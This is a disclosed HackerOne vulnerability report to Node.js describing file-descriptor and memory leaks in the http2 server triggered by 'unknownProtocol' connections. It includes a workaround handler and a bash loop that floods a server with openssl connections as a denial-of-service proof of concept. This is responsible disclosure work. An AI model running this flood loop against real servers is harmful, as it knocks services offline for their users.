# HTTP2 'unknownProtocol' cause Denial of Service by resource exhaustion

## Report Details
- **Report ID**: 1043360
- **URL**: https://hackerone.com/reports/1043360
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-11-25T11:06:27.818Z
- **Disclosed**: 2021-03-15T08:25:43.492Z

## Reporter
- **Username**: omicronenergy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:** 
Node.js http2 server is vulnerable against denial of service attacks when too many connection attempts with an 'unknownProtocol' are established. This leads to a leak of file descriptors. If a file descriptor limit is configured on the system, then the server is unable to accept new connections and prevent the process also from opening, e.g. a file. If no file descriptor limit is configured, then this lead to an excessive memory usage and cause the system to run out of memory.

**Description:**
If an attacker can establish an arbitrary amount of connections to the server and achieves that no session is instantiated by sending data causing the `unknownProtocol` event, then the socket is immediately closed by returning an error message.

If the attacker closes the socket before this can happen or simply do not respond to the response, the node process starts leaking file descriptors and the memory consumption increases dramatically. Node will wait for the response to the `unknownProtocol` message, which will never come.

To solve this issue we registered to the `unknownProtocol` event and had to implement two things:

1. Call `socket.end()` without returning data, which seems to solve the problem partially. The amount of leaked file descriptors decreased dramatically but it is still leaking.
2. Starting a timer and force a `socket.destroy()` after the timeout.

Our current workaround for the problem looks like this:

```
server.on('unknownProtocol', socket => {
  // Install a timeout of 10 second if the socket was
  // not successfully closed, then destroy the socket
  // to ensure that the underlying resources are released.
  const timer = setTimeout(() => {
    if (!socket.destroyed) {
      socket.destroy();
    }
  }, 10000);
  // Un-reference the timer to avoid blocking
  // of application shutdown and clear the timeout
  // if the socket was successfully closed.
  timer.unref();

  // ATTENTION: Do not use the cb from the end call,
  // because this also causes leaks!
  socket.once('close', () => clearTimeout(timer));

  // Try to gracefully close the socket
  // ATTENTION: The default implementation provides an error
  // message to the client, but if the client does not respond
  // this causes the graceful close to fail. Therefore the
  // socket is closed here without any message.
  socket.end();
});
```

Once the node process reached the file descriptor limit of the system it is not possible to establish any new connection to the server. Next the process cannot not do any other operations that require a new file descriptor (e.g. opening a file). If the system has no file descriptor limit, then the process will continue consuming memory until the system has none left.

## Steps To Reproduce:

The following steps assume you are on a linux system. Everything will run on your host system. The IP in the client is hard-coded to `127.0.0.1` and the port is `50000`. The scripts are kept as simple as possible. 

1. Create a file `client.sh` with the content provided in the Supporting Material section below (don't start it now)
2. Create the Javascript file (see Supporting Material section below) and run the example server (may you want to customize the port). You can also start a non-secure server using `createServer()` if you don't have an example key or cert around.
3. You query the file descriptors with the command provided in the Supporting Material section below. Simply replace `{PID}` with the process id of your node server.
4. Maybe you also want to watch the memory consumption with the tool you prefer.
5. Now you are ready to start the client script.

We initially found this issue by running the Greenbone Vulnerability Manager on our server port with the **OvenVAS default** scanner, the **Fast and ultimate** configuration with all kind of vulnerability tests enabled and the **TCP-SYN Service Ping** alive check.

The affected code that causes this issue seems to be [here](https://github.com/nodejs/node/blob/c0ac692ba786f235f9a4938f52eede751a6a73c9/lib/internal/http2/core.js#L2918-L2929).

We are running on Linux x86 with kernel v4.19.148 with node v12.19.0.

## Impact:
Any code that relies on the http2 server is affected by this behaviour. For example the JavaScript implementation of GRPC also uses a http2 server under the hood.

This attack has very low complexity and can easily trigger a DOS on an unprotected server.

The above server example consumes about 6MB memory after start-up. Running the described attack causes a memory consumption of more than 400MB in approximately 30s and holding more than 7000 file descriptors. Both, the file descriptors and the memory, are never freed.

## Supporting Material/References:

client.sh
```
#!/bin/bash

request="GET / HTTP/1.1 Host: Anything"

while true;
do
    echo $request | openssl s_client -connect 127.0.0.1:50000 > /dev/null 2>&1 &
done
```

Javascript File
```
const http2 = require("http2");
const fs = require("fs");

const port = 50000;

process.on('uncaughtException', error => {
  console.log('An uncaught exception occurred:', error)
});

process.on('unhandledRejection', reason => {
  console.log('An unhandled rejection occurred:', reason)
});

process.on('warning', warning => {
  console.log('A process warning occurred:', warning)
});

function onRequest(req, res) {
  console.log('got request')
}

const serverOptions = {
  key: fs.readFileSync(__dirname + "/key.crt"),
  cert: fs.readFileSync(__dirname + "/cert.crt")
};

http2
  .createSecureServer(serverOptions, onRequest)
  .listen(port, () => {
    console.log("http2 server started on port", port);
  })
  .on('error', (err) => console.log(err))
```
Query file descriptors command
```
ls -l /proc/{PID}/fd | wc -l && ls -l /proc/{PID}/map_files | wc -l
```


If you need anything else let us know.

## Impact

Any code that relies on the http2 server is affected by this behaviour. For example the JavaScript implementation of GRPC also uses a http2 server under the hood.

This attack has very low complexity and can easily trigger a DOS on an unprotected server.

The above server example consumes about 6MB memory after start-up. Running the described attack causes a memory consumption of more than 400MB in approximately 30s and holding more than 7000 file descriptors. Both, the file descriptors and the memory, are never freed.

## Attachments
No attachments
